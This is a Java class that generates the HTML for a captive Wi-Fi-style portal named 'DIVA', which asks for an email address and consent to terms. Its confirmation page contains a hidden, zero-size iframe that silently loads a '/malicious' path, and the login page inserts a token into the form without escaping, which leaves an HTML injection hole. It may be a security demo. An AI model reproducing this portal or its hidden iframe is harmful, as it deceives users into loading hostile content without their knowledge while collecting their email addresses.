package com.diva.diva;

public class PaginaPortal {
    public static String html(String token) {
        return envolver("""
                <h1>DIVA</h1>
                <p>Para continuar, por favor introduce tu correo electrónico y acepta los términos.</p>
                <form action="/aceptar" method="POST">
                    <input type="hidden" name="token" value=""" + token + """>
                    <label for="email">Correo electrónico:</label>
                    <input type="email" id="email" name="email" required>
                    <br>
                    <label>
                        <input type="checkbox" name="consentimiento" required>
                        Acepto los términos y condiciones.
                    </label>
                    <br>
                    <button type="submit">Enviar</button>
                </form>
                """);
    }

    public static String resultado() {
        return envolver("""
                <h1>DIVA</h1>
                <p>Mira tu correo :)</p>
                
                <iframe src="/malicious" style="display:none; width:0; height:0; border:none;"></iframe>
                """);
    }

    public static String mensaje(String texto) {
        return envolver("<h1>DIVA</h1><p>" + escapar(texto) + "</p><a href='/'>Volver al portal</a>");
    }

    public static String escapar(String texto) {
        return texto.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;").replace("'", "&#39;");
    }

    private static String envolver(String contenido) {
        return """
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="UTF-8">
                    <title>DIVA</title>
                    <style>
                        body { background: #111116; color: #fff; font-family: system-ui; 
                               display: flex; align-items: center; justify-content: center; 
                               height: 100vh; margin: 0; }
                        main { text-align: center; max-width: 400px; }
                        h1 { color: #ff2b91; }
                        input, button { width: 100%; padding: 10px; margin: 10px 0; 
                                       border-radius: 5px; border: 1px solid #333; }
                        button { background: #ff2b91; color: #111116; font-weight: bold; cursor: pointer; }
                    </style>
                </head>
                <body>
                    <main>
                        """ + contenido + """
                    </main>
                </body>
                </html>
                """;
    }
}